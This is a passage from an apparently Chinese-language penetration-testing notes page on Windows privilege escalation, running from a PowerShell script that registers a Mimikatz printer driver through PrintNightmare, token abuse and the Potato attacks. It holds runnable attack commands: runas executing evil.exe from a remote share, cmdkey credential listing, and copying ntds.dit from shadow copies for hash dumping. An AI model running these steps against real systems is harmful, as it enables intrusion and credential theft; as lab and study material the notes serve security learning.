</span><span class="nx">New-ItemProperty</span><span class="w"> </span><span class="nt">-Path</span><span class="w"> </span><span class="p">(</span><span class="nv">$RegStartPrinter</span><span class="w"> </span><span class="o">+</span><span class="w"> </span><span class="s1">'\CopyFiles\Kiwi'</span><span class="p">)</span><span class="w">   </span><span class="nt">-Name</span><span class="w"> </span><span class="s1">'Files'</span><span class="w">     </span><span class="nt">-PropertyType</span><span class="w"> </span><span class="s1">'MultiString'</span><span class="w"> </span><span class="nt">-Value</span><span class="w"> </span><span class="p">(</span><span class="s1">'mimispool.dll'</span><span class="p">)</span><span class="w"> </span><span class="o">|</span><span class="w"> </span><span class="n">Out-Null</span><span class="w">
</span><span class="nx">New-ItemProperty</span><span class="w"> </span><span class="nt">-Path</span><span class="w"> </span><span class="p">(</span><span class="nv">$RegStartPrinter</span><span class="w"> </span><span class="o">+</span><span class="w"> </span><span class="s1">'\CopyFiles\Kiwi'</span><span class="p">)</span><span class="w">   </span><span class="nt">-Name</span><span class="w"> </span><span class="s1">'Module'</span><span class="w">    </span><span class="nt">-PropertyType</span><span class="w"> </span><span class="s1">'String'</span><span class="w">      </span><span class="nt">-Value</span><span class="w"> </span><span class="s1">'mscms.dll'</span><span class="w">       </span><span class="o">|</span><span class="w"> </span><span class="n">Out-Null</span><span class="w">
</span><span class="nx">New-Item</span><span class="w">         </span><span class="nt">-Path</span><span class="w"> </span><span class="p">(</span><span class="nv">$RegStartPrinter</span><span class="w"> </span><span class="o">+</span><span class="w"> </span><span class="s1">'\CopyFiles\Litchi'</span><span class="p">)</span><span class="w"> </span><span class="o">|</span><span class="w"> </span><span class="n">Out-Null</span><span class="w">
</span><span class="nx">New-ItemProperty</span><span class="w"> </span><span class="nt">-Path</span><span class="w"> </span><span class="p">(</span><span class="nv">$RegStartPrinter</span><span class="w"> </span><span class="o">+</span><span class="w"> </span><span class="s1">'\CopyFiles\Litchi'</span><span class="p">)</span><span class="w"> </span><span class="nt">-Name</span><span class="w"> </span><span class="s1">'Directory'</span><span class="w"> </span><span class="nt">-PropertyType</span><span class="w"> </span><span class="s1">'String'</span><span class="w">      </span><span class="nt">-Value</span><span class="w"> </span><span class="s1">'W32X86\3'</span><span class="w">        </span><span class="o">|</span><span class="w"> </span><span class="n">Out-Null</span><span class="w">
</span><span class="nx">New-ItemProperty</span><span class="w"> </span><span class="nt">-Path</span><span class="w"> </span><span class="p">(</span><span class="nv">$RegStartPrinter</span><span class="w"> </span><span class="o">+</span><span class="w"> </span><span class="s1">'\CopyFiles\Litchi'</span><span class="p">)</span><span class="w"> </span><span class="nt">-Name</span><span class="w"> </span><span class="s1">'Files'</span><span class="w">     </span><span class="nt">-PropertyType</span><span class="w"> </span><span class="s1">'MultiString'</span><span class="w"> </span><span class="nt">-Value</span><span class="w"> </span><span class="p">(</span><span class="s1">'mimispool.dll'</span><span class="p">)</span><span class="w"> </span><span class="o">|</span><span class="w"> </span><span class="n">Out-Null</span><span class="w">
</span><span class="nx">New-ItemProperty</span><span class="w"> </span><span class="nt">-Path</span><span class="w"> </span><span class="p">(</span><span class="nv">$RegStartPrinter</span><span class="w"> </span><span class="o">+</span><span class="w"> </span><span class="s1">'\CopyFiles\Litchi'</span><span class="p">)</span><span class="w"> </span><span class="nt">-Name</span><span class="w"> </span><span class="s1">'Module'</span><span class="w">    </span><span class="nt">-PropertyType</span><span class="w"> </span><span class="s1">'String'</span><span class="w">      </span><span class="nt">-Value</span><span class="w"> </span><span class="s1">'mscms.dll'</span><span class="w">       </span><span class="o">|</span><span class="w"> </span><span class="n">Out-Null</span><span class="w">
</span><span class="nx">New-Item</span><span class="w">         </span><span class="nt">-Path</span><span class="w"> </span><span class="p">(</span><span class="nv">$RegStartPrinter</span><span class="w"> </span><span class="o">+</span><span class="w"> </span><span class="s1">'\CopyFiles\Mango'</span><span class="p">)</span><span class="w">  </span><span class="o">|</span><span class="w"> </span><span class="n">Out-Null</span><span class="w">
</span><span class="nx">New-ItemProperty</span><span class="w"> </span><span class="nt">-Path</span><span class="w"> </span><span class="p">(</span><span class="nv">$RegStartPrinter</span><span class="w"> </span><span class="o">+</span><span class="w"> </span><span class="s1">'\CopyFiles\Mango'</span><span class="p">)</span><span class="w">  </span><span class="nt">-Name</span><span class="w"> </span><span class="s1">'Directory'</span><span class="w"> </span><span class="nt">-PropertyType</span><span class="w"> </span><span class="s1">'String'</span><span class="w">      </span><span class="nt">-Value</span><span class="w"> </span><span class="bp">$null</span><span class="w">             </span><span class="o">|</span><span class="w"> </span><span class="n">Out-Null</span><span class="w">
</span><span class="nx">New-ItemProperty</span><span class="w"> </span><span class="nt">-Path</span><span class="w"> </span><span class="p">(</span><span class="nv">$RegStartPrinter</span><span class="w"> </span><span class="o">+</span><span class="w"> </span><span class="s1">'\CopyFiles\Mango'</span><span class="p">)</span><span class="w">  </span><span class="nt">-Name</span><span class="w"> </span><span class="s1">'Files'</span><span class="w">     </span><span class="nt">-PropertyType</span><span class="w"> </span><span class="s1">'MultiString'</span><span class="w"> </span><span class="nt">-Value</span><span class="w"> </span><span class="bp">$null</span><span class="w">             </span><span class="o">|</span><span class="w"> </span><span class="n">Out-Null</span><span class="w">
</span><span class="nx">New-ItemProperty</span><span class="w"> </span><span class="nt">-Path</span><span class="w"> </span><span class="p">(</span><span class="nv">$RegStartPrinter</span><span class="w"> </span><span class="o">+</span><span class="w"> </span><span class="s1">'\CopyFiles\Mango'</span><span class="p">)</span><span class="w">  </span><span class="nt">-Name</span><span class="w"> </span><span class="s1">'Module'</span><span class="w">    </span><span class="nt">-PropertyType</span><span class="w"> </span><span class="s1">'String'</span><span class="w">      </span><span class="nt">-Value</span><span class="w"> </span><span class="s1">'mimispool.dll'</span><span class="w">   </span><span class="o">|</span><span class="w"> </span><span class="n">Out-Null</span><span class="w">
</span></code></pre></div></div>
<p>Execute the driver</p>
<div class="language-powershell highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="nv">$serverName</span><span class="w">  </span><span class="o">=</span><span class="w"> </span><span class="s1">'dc.purple.lab'</span><span class="w">
</span><span class="nv">$printerName</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="s1">'Universal Priv Printer'</span><span class="w">
</span><span class="nv">$fullprinterName</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="s1">'\\'</span><span class="w"> </span><span class="o">+</span><span class="w"> </span><span class="nv">$serverName</span><span class="w"> </span><span class="o">+</span><span class="w"> </span><span class="s1">'\'</span><span class="w"> </span><span class="o">+</span><span class="w"> </span><span class="nv">$printerName</span><span class="w"> </span><span class="o">+</span><span class="w"> </span><span class="s1">' - '</span><span class="w"> </span><span class="o">+</span><span class="w"> </span><span class="err">$</span><span class="p">(</span><span class="kr">If</span><span class="w"> </span><span class="p">([</span><span class="n">System.Environment</span><span class="p">]::</span><span class="n">Is64BitOperatingSystem</span><span class="p">)</span><span class="w"> </span><span class="p">{</span><span class="s1">'x64'</span><span class="p">}</span><span class="w"> </span><span class="kr">Else</span><span class="w"> </span><span class="p">{</span><span class="s1">'x86'</span><span class="p">})</span><span class="w">
</span><span class="n">Remove-Printer</span><span class="w"> </span><span class="nt">-Name</span><span class="w"> </span><span class="nv">$fullprinterName</span><span class="w"> </span><span class="nt">-ErrorAction</span><span class="w"> </span><span class="nx">SilentlyContinue</span><span class="w">
</span><span class="n">Add-Printer</span><span class="w"> </span><span class="nt">-ConnectionName</span><span class="w"> </span><span class="nv">$fullprinterName</span><span class="w">
</span></code></pre></div></div>
<h3 id="printernightmare">PrinterNightmare</h3>
<p>漏洞CVE编号：CVE-2021-1675。未经身份验证的远程攻击者可利用该漏洞以SYSTEM权限在域控制器上执行任意代码，从而获得整个域的控制权。建议受影响用户及时更新漏洞补丁进行防护，做好资产自查以及预防工作，以免遭受黑客攻击。</p>

<p><strong>影响范围</strong></p>

<p>Windows Server 2012 R2 (Server Core installation)
Windows Server 2012 R2
Windows Server 2012 (Server Core installation)
Windows Server 2012
Windows Server 2008 R2 for x64-based Systems Service Pack 1 (Server Core installation)
Windows Server 2008 R2 for x64-based Systems Service Pack 1
Windows Server 2008 for x64-based Systems Service Pack 2 (Server Core installation)
Windows Server 2008 for x64-based Systems Service Pack 2
Windows Server 2008 for 32-bit Systems Service Pack 2 (Server Core installation)
Windows Server 2008 for 32-bit Systems Service Pack 2
Windows RT 8.1
Windows 8.1 for x64-based systems
Windows 8.1 for 32-bit systems
Windows 7 for x64-based Systems Service Pack 1
Windows 7 for 32-bit Systems Service Pack 1
Windows Server 2016 (Server Core installation)
Windows Server 2016
Windows 10 Version 1607 for x64-based Systems
Windows 10 Version 1607 for 32-bit Systems
Windows 10 for x64-based Systems
Windows 10 for 32-bit Systems
Windows Server, version 20H2 (Server Core Installation)
Windows 10 Version 20H2 for ARM64-based Systems
Windows 10 Version 20H2 for 32-bit Systems
Windows 10 Version 20H2 for x64-based Systems
Windows Server, version 2004 (Server Core installation)
Windows 10 Version 2004 for x64-based Systems
Windows 10 Version 2004 for ARM64-based Systems
Windows 10 Version 2004 for 32-bit Systems
Windows 10 Version 21H1 for 32-bit Systems
Windows 10 Version 21H1 for ARM64-based Systems
Windows 10 Version 21H1 for x64-based Systems
Windows 10 Version 1909 for ARM64-based Systems
Windows 10 Version 1909 for x64-based Systems
Windows 10 Version 1909 for 32-bit Systems
Windows Server 2019 (Server Core installation)
Windows Server 2019
Windows 10 Version 1809 for ARM64-based Systems
Windows 10 Version 1809 for x64-based Systems
Windows 10 Version 1809 for 32-bit Systems</p>

<ul>
  <li><a href="https://github.com/cube0x0/CVE-2021-1675">cube0x0/CVE-2021-1675: C# and Impacket implementation of PrintNightmare CVE-2021-1675/CVE-2021-34527</a></li>
  <li>
    <table>
      <tbody>
        <tr>
          <td>[〖EXP〗Ladon打印机漏洞提权CVE-2021-1675复现</td>
          <td>K8哥哥’s Blog](https://k8gege.org/p/CVE-2021-1675.html)</td>
        </tr>
      </tbody>
    </table>
  </li>
</ul>

<h3 id="bring-your-own-vulnerability">Bring Your Own Vulnerability</h3>
<p>windows 允许低权限用户安装打印机驱动，因此我们可以自行安装带有漏洞的驱动程序，然后通过这些驱动程序的漏洞提权到 SYSTEM。</p>

<p>Concealed Position : https://github.com/jacob-baines/concealed_position</p>
<ul>
  <li>ACIDDAMAGE - CVE-2021-35449 - Lexmark Universal Print Driver LPE</li>
  <li>RADIANTDAMAGE - CVE-2021-38085 - Canon TR150 Print Driver LPE</li>
  <li>POISONDAMAGE - CVE-2019-19363 - Ricoh PCL6 Print Driver LPE</li>
  <li>SLASHINGDAMAGE - CVE-2020-1300 - Windows Print Spooler LPE</li>
</ul>

<p>利用 exp：</p>
<ul>
  <li><a href="https://github.com/jacob-baines/concealed_position">jacob-baines/concealed_position: Bring your own print driver privilege escalation tool</a></li>
</ul>

<h2 id="利用-runas-命令提权或降权">利用 RunAS 命令提权或降权</h2>
<p>RunAS 命令使用场景：</p>
<ol>
  <li>权限不够读不到帐密或 HASH 的情况下，验证用户是否使用某个已保存的密码，使用该已保存的密码可实现提权</li>
  <li>SYSTEM 权限降权到某个用户进行操作时，例如切换到特定的用户，读取对应的浏览器记录、或者获取特定用户的 shell 等。</li>
</ol>

<p>枚举保存的密码：</p>
<div class="language-bat highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="nb">cmdkey</span> <span class="na">/list
</span><span class="kd">Currently</span> <span class="kd">stored</span> <span class="kd">credentials</span>:
    <span class="kd">Target</span>: <span class="kd">Domain</span><span class="nl">:interactive</span><span class="o">=</span><span class="kd">WORKGROUP</span>\Administrator
    <span class="kd">Type</span>: <span class="kd">Domain</span> <span class="kd">Password</span>
    <span class="kd">User</span>: <span class="kd">WORKGROUP</span>\Administrator
</code></pre></div></div>
<p>使用保存的凭证连接远程 SMB 或者直接运行命令：</p>
<div class="language-bat highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="nb">runas</span> <span class="na">/savecred /user</span><span class="nl">:WORKGROUP</span>\Administrator <span class="s2">"\\10.XXX.XXX.XXX\SHARE\evil.exe"</span>
<span class="nb">runas</span> <span class="na">/savecred /user</span><span class="nl">:Administrator</span> <span class="s2">"cmd.exe /k whoami"</span>
</code></pre></div></div>

<p>其他利用：</p>

<ul>
  <li><a href="http://k8gege.org/Ladon/runas.html">〖教程〗Ladon非交互式runas执行命令/反弹SHELL </a>
    <blockquote>
      <p>系统自带Runas命令需要交互式登陆，在webshell或不支持交互式的shell下使用麻烦。而Ladon的Runas则完美解决了以上问题，支持非交互式模拟登陆指定用户运行程序或命令。</p>
    </blockquote>
  </li>
</ul>

<h2 id="利用-shadow-copies-提权域控">利用 Shadow Copies 提权（域控）</h2>
<p>该利用方式一般用于从域控中获取 ntds.dit 文件（活动目录中的所有数据都保存在该文件中）。</p>

<p>获取卷影位置：</p>
<div class="language-powershell highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="c"># List shadow copies using vssadmin (Needs Admnistrator Access)</span><span class="w">
</span><span class="n">vssadmin</span><span class="w"> </span><span class="nx">list</span><span class="w"> </span><span class="nx">shadows</span><span class="w">
  
</span><span class="c"># List shadow copies using diskshadow</span><span class="w">
</span><span class="n">diskshadow</span><span class="w"> </span><span class="nx">list</span><span class="w"> </span><span class="nx">shadows</span><span class="w"> </span><span class="nx">all</span><span class="w">

</span></code></pre></div></div>

<p>创建软链接以便查看。</p>
<div class="language-powershell highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="c"># Make a symlink to the shadow copy and access </span><span class="w">
</span><span class="n">mklink</span><span class="w"> </span><span class="nx">/d</span><span class="w"> </span><span class="nx">c:\shadowcopy</span><span class="w"> </span><span class="nx">\\</span><span class="nf">?</span><span class="nx">\GLOBALROOT\Device\HarddiskVolumeShadowCopy1\</span><span class="w">
</span></code></pre></div></div>

<p>或者创建一个卷影拷贝，然后复制出来</p>
<div class="language-powershell highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="n">vssadmin</span><span class="w"> </span><span class="nx">create</span><span class="w"> </span><span class="nx">shadow</span><span class="w"> </span><span class="nx">/for</span><span class="o">=</span><span class="n">c:</span><span class="w">
</span><span class="nx">copy</span><span class="w"> </span><span class="nx">\</span><span class="nf">?</span><span class="nx">\GLOBALROOT\Device\HarddiskVolumeShadowCopy2\windows\NTDS\ntds.dit</span><span class="w"> </span><span class="nx">c:\ntds.dit</span><span class="w">
</span></code></pre></div></div>

<p>获取到 ntds 后，可以想办法获取其中的散列值。</p>
<ul>
  <li>Impacket 中的 Secretsdump</li>
  <li>msf 中的 Psexec_ntdsgrab 模块</li>
  <li>msf 中 Meterpreter会话 + windows/gather/credentials/domain_hashdump</li>
</ul>

<p><strong>参考资料</strong>：</p>
<ul>
  <li><a href="https://zhuanlan.zhihu.com/p/441167567">域控安全之域渗透 - 知乎</a></li>
</ul>

<h2 id="利用-psexec-提权win2003--win2008">利用 PsExec 提权(Win2003 &amp; Win2008)</h2>
<p>PsExec 是 windows 内核套件 SysInternalSuite 中的一个工具，可以从 Administrator 提权到 SYSTEM</p>

<p>下载地址:<a href="https://learn.microsoft.com/en-us/sysinternals/downloads/">Sysinternals Utilities - Sysinternals | Microsoft Learn</a></p>
<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>PsExec -i -s cmd
</code></pre></div></div>

<p>参考</p>
<ul>
  <li><a href="https://github.com/SexyBeast233/SecBooks/blob/main/%E3%80%90%E5%85%AC%E4%BC%97%E5%8F%B7%E6%96%87%E7%AB%A0%E3%80%91bypass/%E5%AE%9E%E6%88%98%E9%81%87%E8%A7%81%E5%88%B0%E7%9A%84%E5%A5%BD%E7%94%A8%E6%8F%90%E6%9D%83%E6%96%B9%E6%B3%95%E9%9B%86%E5%90%88.md">SecBooks/【公众号文章】bypass/实战遇见到的好用提权方法集合.md at main · SexyBeast233/SecBooks</a></li>
</ul>

<h2 id="利用-windows-自带文件脚本提权">利用 Windows 自带文件、脚本提权</h2>
<p>Living Off The Land Binaries and Scripts (and also Libraries) : https://lolbas-project.github.io/</p>

<h2 id="滥用-token-提权">滥用 Token 提权</h2>
<p>条件：</p>
<ul>
  <li>已经拿到非管理员权限的服务帐户</li>
</ul>

<p>效果：</p>
<ul>
  <li>提权至 SYSTEM</li>
</ul>

<h3 id="背景知识">背景知识</h3>

<hr />
<p>当用户登录时，系统会创建一个访问令牌。用户执行的每个进程都有该访问令牌的副本。令牌标识了用户、用户的组、用户的权限以及SID（安全标识符）。</p>

<p>当本地管理员登录时，系统会创建两个访问令牌：一个具有管理员权限，另一个具有普通权限。默认情况下，当该用户执行进程时，将使用具有常规（非管理员）权限的进程。当此用户尝试以管理员身份执行任何操作（例如“以管理员身份运行”）时，将使用 UAC 来请求权限。</p>

<p>使用 whoami /priv 可以查看当前用户的权限。拥有下面权限时可考虑使用这种方式：</p>
<ul>
  <li>iis sqlserver 的用户通常具有 SeImpersonatePrivilege 和 SeAssignPrimaryPrivilege 权限。</li>
  <li>服务用户通常拥有 SeBackupPrivilege 和 SeRestorePrivilege 权限。</li>
</ul>

<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>    SeIncreaseQuotaPrivilege: DISABLED
    SeShutdownPrivilege: DISABLED
    SeAuditPrivilege: DISABLED
    SeChangeNotifyPrivilege: SE_PRIVILEGE_ENABLED_BY_DEFAULT, SE_PRIVILEGE_ENABLED
    SeUndockPrivilege: DISABLED
    SeIncreaseWorkingSetPrivilege: DISABLED
    SeTimeZonePrivilege: DISABLED
</code></pre></div></div>

<p><strong>不同的几种权限可能会用于不同的攻击场景</strong></p>

<p><strong>1. SeImpersonatePrivilege</strong>
任何拥有此权限的进程都可以模拟（但不能创建）它能够处理的任何令牌。  您可以从 Windows 服务 (DCOM) 获取特权令牌，使其针对该漏洞执行 NTLM 身份验证，然后以 SYSTEM 身份执行进程。</p>

<p>利用方法：</p>
<ol>
  <li>
    <p>使用 NTLM relay 到本地协商获得系统用户的 token。</p>
  </li>
  <li>
    <p>可以使用开源工具烂土豆、孤独土豆或多汁土豆。</p>
  </li>
  <li>
    <p>通过WinAPI CreateProcessWithToken创建一个新的进程，传入系统用户的令牌。</p>
  </li>
</ol>

<p>只有具有SeImpersonatePrivilege权限才能成功创建。</p>

<p><strong>2. SeAssignPrimaryPrivilege</strong>
它与 SeImpersonatePrivilege 非常相似，它将使用相同的方法来获取特权令牌。
然后，此权限允许将主令牌分配给新的/挂起的进程。<br />
使用特权模拟令牌，您可以派生主令牌 (DuplicateTokenEx)。有了令牌，您可以使用“CreateProcessAsUser”创建一个新进程，或者创建一个挂起的进程并设置令牌（通常，您不能修改正在运行的进程的主令牌）。</p>

<p>利用方法：</p>
<ul>
  <li>利用 NTLM Relay 到当地谈判获得系统用户的 token</li>
  <li>通过 WinAPI CreateProcessAsUser 创建新进程，传入系统用户的 token，该 token 具有系统权限。</li>
</ul>

<p><strong>3. SeBackupPrivilege</strong>
此权限使系统授予对任何文件的所有读取访问控制（仅限读取）。使用它从注册表中读取本地管理员帐户的密码哈希值，然后将“psexec”或“wmicexec”与哈希值 (PTH) 结合使用。</p>

<p>如果本地管理员被禁用，或者配置为本地管理员在远程连接时不是管理员，则此攻击将不起作用。</p>

<p>攻击场景：收集</p>

<p><strong>4. SeRestorePrivilege</strong>
对系统上任何文件的写入访问控制，无论文件 ACL 为何。你可以修改服务、DLL劫持、设置调试器（图像文件执行选项）……很多选项可以升级</p>
<blockquote>
  <p>攻击场景：持久化；防御规避</p>
</blockquote>

<p><strong>5. SeCreateTokenPrivilege</strong>
仅当用户可以模拟令牌（即使没有 SeImpersonatePrivilege）时，此令牌才可以用作 EoP 方法。
在可能的情况下，如果令牌针对同一用户并且完整性级别小于或等于当前进程完整性级别，则用户可以模拟令牌。在这种情况下，用户可以创建一个模拟令牌并向其添加特权组 SID。</p>
<blockquote>
  <p>攻击方式：提权</p>
</blockquote>

<p><strong>6. SeLoadDriverPrivilege</strong>
加载和卸载设备驱动程序。</p>
<blockquote>
  <p>攻击方式：持久化；防御规避</p>
</blockquote>

<p><strong>7. SeTakeOwnershipPrivilege</strong>
此权限与 SeRestorePrivilege 非常相似。它允许进程通过授予 WRITE_OWNER 访问权限来“获得对象的所有权，而无需授予任意访问权限”。首先，您必须获得要写入的注册表项的所有权并修改 DACL，以便可以在其上写入。</p>
<blockquote>
  <p>攻击场景：持久化；防御规避；收集</p>
</blockquote>

<p><strong>8. SeDebugPrivilege</strong>
它允许持有者调试另一个进程，这包括读取和写入该进程的内存。有许多不同的内存注入策略可以与此特权一起使用，从而规避大多数 AV/HIPS 解决方案。</p>
<blockquote>
  <p>攻击方式：凭据窃取、提权、防御规避等。</p>
</blockquote>

<p><strong>9. SeTcbPrivilege</strong>
此权限将其持有者标识为受信任计算机库的一部分。某些受信任的受保护子系统被授予此特权。</p>

<blockquote>
  <p>攻击场景：权限提升</p>
</blockquote>

<p><strong>参考：</strong></p>
<ul>
  <li><a href="https://www.wangan.com/p/7fy747bffedd4919">Windows Token原理及利用 - 网安</a></li>
  <li><a href="https://www.thehackerworld.com/Hacker-topic/20369.html/">渗透技巧——利用Windows的九大权限 - WEB and server security vulnerabilities - 黑客中文论坛网站</a></li>
</ul>

<hr />

<p>基于 Token 提权的利用工具就是常用的 Potato 家族了：</p>

<p><img src="https://de34dnotespics.oss-cn-beijing.aliyuncs.com/img/20231120023623.png" alt="20231120023623" /></p>

<h3 id="origin-potatoms08-068">Origin Potato(MS08-068)</h3>
<p>Origin Potato 就是 NTLM-Relay，微软在 kb957097 补丁中通过修复 SMB 身份验证答复的验证方式来防止凭据重播。</p>

<p><img src="https://de34dnotespics.oss-cn-beijing.aliyuncs.com/img/20231120071554.png" alt="20231120071554" /></p>

<p>当主机 A 向主机 B 进行 SMB 认证的时候，将 pszTargetName 设置为 cifs/B，然后在 type2 拿到 B 发送的 Challenge 之后，在 lsass 里面缓存 (Challenge,cifs/B)，接着 B 拿到 A 的 type3，这时会去检查 lsass 缓存里是否有 (Challenge,cifs/B)，如果有就说明这是同一台主机，那么认证失败。</p>

<h3 id="hot-potato">Hot Potato</h3>
<p>Hot Potato 是 Potato 家族最早的利用方式，其攻击原理如下：</p>
<ol>
  <li>Windows Update 服务以 SYSTEM 权限运行，且会发起 NTLM 认证，如果能够作为中间人，我们就能够通过 NTLM Relay 获取到 SYSTEM 权限。</li>
  <li>Windows Update 服务在运行时会默认请求 http://wpad/wpad.dat 这个  URL 以获取网络代理的配置，但这个域名并不是所有主机都会配置，公网上也没有这个域名，根据 Windows 的域名解析顺序（host-&gt; DNS 查询 -&gt; NBNS 查询），只要攻击者伪造一个 NBNS 查询的响应，就能够控制 Windows Update 服务的代理指向自己。</li>
  <li>攻击者以中间人的身份完成 NTLM Relay 从而获取到 System 权限的 token。</li>
</ol>

<p>影响范围：</p>
<ul>
  <li>Windows 7,8,10,Server 2008 以及 Server 2012</li>
</ul>

<p><img src="https://de34dnotespics.oss-cn-beijing.aliyuncs.com/img/20231120023106.png" alt="20231120023106" /></p>

<p>其步骤如下：</p>
<ol>
  <li>Windows Update 服务默认情况下会请求 http://wpad/wpad.dat 来获取网络代理配置。但不是所有的主机都存在保存着该域名解析的结果，当本地 HOST 及 DNS 查询都无法获取该域名的解析结果时，就会触发 NBNS 查询。</li>
  <li>攻击者在本地发起 NBNS（NetBIOS 名称服务）欺骗。使得 Windows 在本地广播查询目标 HOST 时，攻击者伪造响应，声称 wpad 服务器 IP 地址为 127.0.0.1，并且返回网络代理配置为 127.0.0.1:80</li>
  <li>Windows Update 服务获取到网络代理后，所有的 http 流量就都会经过攻击者搭建的 127.0.0.1:80。</li>
  <li>此时 Windows Update 服务进行 NTLM 认证中的 Hash 就会被攻击者捕获，从而发起 NTLM Relay 攻击。</li>
</ol>

<p>局限：
这种攻击手法需要等待 windows update 服务发起更新请求。</p>

<h3 id="rotten-potato">Rotten Potato</h3>
<p>攻击原理：</p>
<ol>
  <li>COM （组件对象模型）API 可以在指定的网络位置加载一个服务对象。以下面的代码为例，COM API 函数 CoGetInstanceFromIStorage 会根据指定的 IP 地址和端口号 127.0.0.1:6666 去获取指定的对象实例，该对象实例的 Guid 为 4991d34b-80a1-4291-83b6-3328366b9097，对应 BITS 实例。如果此时攻击者在 127.0.0.1:6666 端口正常回复，就可以强制让 COM 以 SYSTEM 权限对 6666 端口发起 net-NTLM 认证。（为什么选择 BITS 实例，<strong>是因为 BITS 实现了 IMarshal 接口</strong>并允许代理声明强制 NTLM 身份验证）
    <div class="language-c highlighter-rouge"><div class="highlight"><pre class="highlight"><code> <span class="n">public</span> <span class="k">static</span> <span class="kt">void</span> <span class="nf">BootstrapComMarshal</span><span class="p">()</span>
 <span class="p">{</span>
 <span class="n">IStorage</span> <span class="n">stg</span> <span class="o">=</span> <span class="n">ComUtils</span><span class="p">.</span><span class="n">CreateStorage</span><span class="p">();</span>
    
 <span class="c1">// Use a known local system service COM server, in this cast BITSv1</span>
 <span class="n">Guid</span> <span class="n">clsid</span> <span class="o">=</span> <span class="n">new</span> <span class="n">Guid</span><span class="p">(</span><span class="s">"4991d34b-80a1-4291-83b6-3328366b9097"</span><span class="p">);</span>
    
 <span class="n">TestClass</span> <span class="n">c</span> <span class="o">=</span> <span class="n">new</span> <span class="n">TestClass</span><span class="p">(</span><span class="n">stg</span><span class="p">,</span> <span class="n">String</span><span class="p">.</span><span class="n">Format</span><span class="p">(</span><span class="s">"{0}[{1}]"</span><span class="p">,</span> <span class="s">"127.0.0.1"</span><span class="p">,</span> <span class="mi">6666</span><span class="p">));</span> <span class="c1">// ip and port</span>
    
 <span class="n">MULTI_QI</span><span class="p">[]</span> <span class="n">qis</span> <span class="o">=</span> <span class="n">new</span> <span class="n">MULTI_QI</span><span class="p">[</span><span class="mi">1</span><span class="p">];</span>
    
 <span class="n">qis</span><span class="p">[</span><span class="mi">0</span><span class="p">].</span><span class="n">pIID</span> <span class="o">=</span> <span class="n">ComUtils</span><span class="p">.</span><span class="n">IID_IUnknownPtr</span><span class="p">;</span>
 <span class="n">qis</span><span class="p">[</span><span class="mi">0</span><span class="p">].</span><span class="n">pItf</span> <span class="o">=</span> <span class="n">null</span><span class="p">;</span>
 <span class="n">qis</span><span class="p">[</span><span class="mi">0</span><span class="p">].</span><span class="n">hr</span> <span class="o">=</span> <span class="mi">0</span><span class="p">;</span>
    
 <span class="n">CoGetInstanceFromIStorage</span><span class="p">(</span><span class="n">null</span><span class="p">,</span> <span class="n">ref</span> <span class="n">clsid</span><span class="p">,</span> <span class="n">null</span><span class="p">,</span> <span class="n">CLSCTX</span><span class="p">.</span><span class="n">CLSCTX_LOCAL_SERVER</span><span class="p">,</span> <span class="n">c</span><span class="p">,</span> <span class="mi">1</span><span class="p">,</span>       <span class="n">qis</span><span class="p">);</span>
 <span class="p">}</span>
</code></pre></div>    </div>
  </li>
  <li>如果我们能够完成这一次 NTLM 认证，就可以获取到 token，<strong>作者也使用了一个巧妙的方法，调用 AcceptSecurityContext 函数来处理 NLTM 认证</strong>
    <ol>
      <li>AcceptSecurityContext 是 Windows API 中用于安全上下文建立的函数之一，特别是在使用安全套接字（Secure Socket Layer，SSL）或者安全的远程过程调用（Remote Procedure Call，RPC）等场景下。它通常用于在<strong>服务端接受来自客户端的身份验证</strong>，并建立一个安全上下文（security context）以便进行后续的安全通信。<strong>这样一来，COM 充当客户端，AcceptSecurityContext 充当服务端，就能够完成 NTLM 认证。</strong></li>
    </ol>
  </li>
  <li>尽管攻击者作为中间人将 AcceptSecurityContext 与 COM 之间建立起了 NTLM 认证，但两者之间的交互过程并不是简单的转发，主要有两个问题：
    <ol>
      <li>要正确响应 COM 服务，需要正确的 RPC 协议的数据包。作者将 <strong>COM 的请求发送到 135 端口的 rpcss 服务来获取一个响应模板</strong>。</li>
      <li>两个次 NTLM Challenge 报文中的 NTLM Server Challenge 以及 Reserved 字段不同，需要进行修改。</li>
    </ol>
  </li>
  <li>上述的两个问题解决之后，就可以巧妙地获取到 SYSTEM token。有了 SYSTEM 权限的 token 之后，如果当前用户拥有 SelmpersonatePrivilege 或者 SeAssignPrimaryToken 权限，就可以通过该 Token 创建新进程达成提权。</li>
</ol>

<p><img src="https://de34dnotespics.oss-cn-beijing.aliyuncs.com/img/20231120024104.png" alt="20231120024104" /></p>

<p>步骤如下：</p>
<ol>
  <li>利用 CoGetInstanceFromIStorage API 强制 NT AUTHORITY/SYSTEM 运行的 RPC 服务向我们的本地代理(localhost:6666)发起 NTLM 身份验证。
    <ol>
      <li>CoGetInstanceFromIStorage API</li>
    </ol>
  </li>
  <li>RPC 向代理发送 NTLM Negotiate 包。</li>
  <li>代理将 NTLM Negotiate 包转发给端口 135 的 RPC 服务。于此同时，调用 AcceptSecurityContext 来强制进行本地身份验证。</li>
  <li>RPC 135 和 AcceptSecurityContext 向代理发送 NTLM Challenge。两个数据包的内容被混合以匹配本地协商并转发到 RPC，其中 RPC 135 响应的报文充当 RPC 调用的模板。</li>
  <li>RPC 使用 NLTM Auth 包进行响应，该包被代理服务器发送到 AcceptSecurityContext (8.) 并执行模拟 (9.)。</li>
</ol>

<p>影响范围：</p>
<ul>
  <li>&lt; win10 1809 和 windows server 2019</li>
</ul>

<hr />
<p>相关概念：</p>
<ol>
  <li>分布式组件对象模型(DCOM)
    <ol>
      <li>COM 是 Windows 的一个组件，它促进了软件之间的互操作性，DCOM 通过远程过程调用(RPC)在网络上扩展了这一点。</li>
    </ol>
  </li>
  <li>后台智能传输服务(BITS) 可供程序员和系统管理员用于从 HTTP Web 服务器和 SMB 文件共享下载文件或将文件上传到其中。
    <ol>
      <li>Windows Update： BITS 服务用于下载和安装 Windows 更新。</li>
